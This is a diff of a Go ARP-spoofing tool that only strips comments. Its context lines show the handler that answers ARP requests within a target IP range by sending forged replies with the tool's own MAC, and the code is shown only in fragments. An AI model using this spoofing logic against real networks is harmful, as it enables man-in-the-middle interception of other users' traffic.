@@ -112,7 +112,6 @@ func (a *ARPSpoofer) Start() {
 	}()
 }
 
-// handlePacket processes captured ARP packets
 func (a *ARPSpoofer) handlePacket(packet gopacket.Packet) {
 	arpLayer := packet.Layer(layers.LayerTypeARP)
 	if arpLayer == nil {
@@ -120,20 +119,16 @@ func (a *ARPSpoofer) handlePacket(packet gopacket.Packet) {
 	}
 
 	arp := arpLayer.(*layers.ARP)
-	// Only process ARP requests
 	if arp.Operation != layers.ARPRequest {
 		return
 	}
 
-	// Convert target IP to net.IP for CIDR check
 	targetIP := net.IP(arp.DstProtAddress)
 
-	// Check if the target IP is in our spoofing range
 	if !a.ipNetwork.Contains(targetIP) {
 		return
 	}
 
-	// Craft ARP reply
 	eth := layers.Ethernet{
 		SrcMAC:       a.mac,
 		DstMAC:       net.HardwareAddr(arp.SourceHwAddress),
@@ -152,7 +147,6 @@ func (a *ARPSpoofer) handlePacket(packet gopacket.Packet) {
 		DstProtAddress:    arp.SourceProtAddress,
 	}
 
-	// Serialize and send the packet
 	buffer := gopacket.NewSerializeBuffer()
 	opts := gopacket.SerializeOptions{
 		FixLengths:       true,
@@ -174,7 +168,6 @@ func (a *ARPSpoofer) handlePacket(packet gopacket.Packet) {
 		net.IP(arp.SourceProtAddress).String())
 }
 
-// Stop terminates the ARP spoofing process
 func (a *ARPSpoofer) Stop() {
 	close(a.stopChan)
 	a.handle.Close()
